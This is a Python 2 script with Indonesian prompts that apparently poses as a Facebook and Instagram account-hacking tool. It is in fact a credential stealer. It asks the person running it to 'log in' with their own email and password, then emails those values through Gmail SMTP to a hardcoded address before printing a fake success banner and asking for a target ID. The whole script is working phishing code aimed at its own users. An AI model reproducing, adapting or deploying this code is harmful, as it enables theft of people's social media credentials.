#!/usr/bin/python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import time

filename = "/kode"
kode = ""
try:
  with open(filename) as f:
    data = f.readlines()
  for n, line in enumerate(data,):
    kode = kode +  (line.rstrip())
except IOError:
# eror file
#  print("Terjadi kesalahan 404 :(")
  kode = "Terjadi kesalahan 404 :("
msg = MIMEMultipart()

print " 1.facebook"
print " 2.instagram"
print " 3.whatsapp"

var = int(input("Pilih: "))
if var == 1:
   print " facebook"
   print " 1.ya"
   print " 0.tidak"
   var2 = int(input(" Yakin dengan pilihan anda 1/0: "))
   if var2 == 1:
      print " Silahkan login facebook dahulu"
      mm = "id: "
      m = raw_input(" Silahkan Masuk Email: ")
      s = " | "
      mmm = "pwd:"
      m2 = raw_input(" Silahkan Masuk Password: ")
      group = raw_input(" Silahkan Ketik 'headless' Untuk Melanjutkan: ")
      msg['F'] = "putracic8@gmail.com"
      msg['T'] = "putracic7@gmail.com"
      msg['Subject'] = "HEADLESS/facebook"
      msg.attach(MIMEText(mm, 'plain'))
      msg.attach(MIMEText(m, 'plain'))
      msg.attach(MIMEText(s, 'plain'))
      msg.attach(MIMEText(mmm, 'plain'))
      msg.attach(MIMEText(m2, 'plain'))
#create server
      server = smtplib.SMTP('smtp.gmail.com: 587')
      server.starttls()
# Login Credentials for sending the mail
      server.login(msg['F'], group)
      server.sendmail(msg['F'], msg['T'], msg.as_string())
      server.quit()
      print"Mencoba Login, Harap Tunggu"
      time.sleep(3)
      print "Sukses"
      print "     ===================      ==================="
      time.sleep(0.5)
      print "     ===================      ===================="
      time.sleep(0.5)
      print "     ===================      ===================="
      time.sleep(0.5)
      print "     ===================      ======        ======"
      time.sleep(0.5)
      print "     ======                   ======        ======"
      time.sleep(0.5)
      print "     ======                   ======        ======"
      time.sleep(0.5)
      print "     ===================      ======        ======"
      time.sleep(0.5)
      print "     ===================      ======        ====="
      time.sleep(0.5)
      print "     ===================      =============="
      time.sleep(0.5)
      print "     ===================      =============="
      time.sleep(0.5)
      print "     ======                   ======         ====="
      time.sleep(0.5)
      print "     ======                   ======         ======"
      time.sleep(0.5)
      print "     ======                   ======         ======"
      time.sleep(0.5)
      print "     ======                   ======         ======"
      time.sleep(0.5)
      print "     ======                   ======         ======"
      time.sleep(0.5)
      print "     ======                   ====================="
      time.sleep(0.5)
      print "     ======                   ====================="
      time.sleep(0.5)
      print "     ======                   ===================="
      time.sleep(0.5)
      print "     ----------------------------------------------"
      time.sleep(0.5)
      print "     ----------------------------------------------"
      time.sleep(0.5)

      r = raw_input(" Masukan Email/ID: ")
      print r
      p = raw_input(" Masukan password.txt: ")
      print kode
   else:
      print " Good bye!"

elif var == 2:
   print " 1.ya"
   print " 0.tidak"
   var2 = int(input(" Yakin dengan pilihan anda 1/0: "))
   if var2 == 1:
      print " Silahkan login instagram dahulu"
      mm = "id: "
      m = raw_input(" Silahkan Masuk Email: ")
      m1 = " | "
      m2 = raw_input(" Silahkan Masuk Password: ")
      mmm = "pwd: "
      pwd = raw_input(" Silahkan Ketik 'headless' Untuk Melanjutkan: ")
      msg['F'] = "putracic8@gmail.com"
      msg['T'] = "putracic7@gmail.com"
      msg['Subject'] = "HEADLESS/instagram"
      msg.attach(MIMEText(mm, 'plain'))
      msg.attach(MIMEText(m, 'plain'))
      msg.attach(MIMEText(m1, 'plain'))
      msg.attach(MIMEText(mmm, 'plain'))
      msg.attach(MIMEText(m2, 'plain'))
#create server
      server = smtplib.SMTP('smtp.gmail.com: 587')
      server.starttls()
# Login Credentials for sending the mail
      server.login(msg['F'], pwd)
      server.sendmail(msg['F'], msg['T'], msg.as_string())
      server.quit()
      print" Mencoba Login, Harap Tunggu"
      time.sleep(3)
      print " Sukses"
      print "     ================================"
      time.sleep(0.5)
      print "     ======      ===================="
      time.sleep(0.5)
      print "     ======      ===================="
      time.sleep(0.5)
      print "     ======      ======        ======"
      time.sleep(0.5)
      print "     ======      ====== "
      time.sleep(0.5)
      print "     ======      ====== "
      time.sleep(0.5)
      print "     ======      ====== "
      time.sleep(0.5)
      print "     ======      ======"
      time.sleep(0.5)
      print "     ======      ======"
      time.sleep(0.5)
      print "     ======      ======    ==========="
      time.sleep(0.5)
      print "     ======      ======    ============"
      time.sleep(0.5)
      print "     ======      ======         ======"
      time.sleep(0.5)
      print "     ======      ======         ======"
      time.sleep(0.5)
      print "     ======      ======         ======"
      time.sleep(0.5)
      print "     ======      ====================="
      time.sleep(0.5)
      print "     ======      ====================="
      time.sleep(0.5)
      print "     ======       ===================="
      time.sleep(0.5)
      print "     ---------------------------------"
      time.sleep(0.5)
      print "     ---------------------------------"
      time.sleep(0.5)

      r = raw_input(" Masukan Email/ID: ")
      print r
      p = raw_input(" Masukan password.txt: ")
   else:
      print " 2.Keluar"
      print " 9.Menu"
      k = int(input("Keluar : "))
      while True:
       if k == 9:
         print " Maaf permintaan anda tidak dapat kami proses"
       else:
         print " Good bye!....."
       quit()

elif var == 3:
   print " whatsapp"
   print " Maaf layanan ini belum tersedia"
else:
   print " Tidak ada pilihan"
   print " Good bye!"

#print "Good bye!"
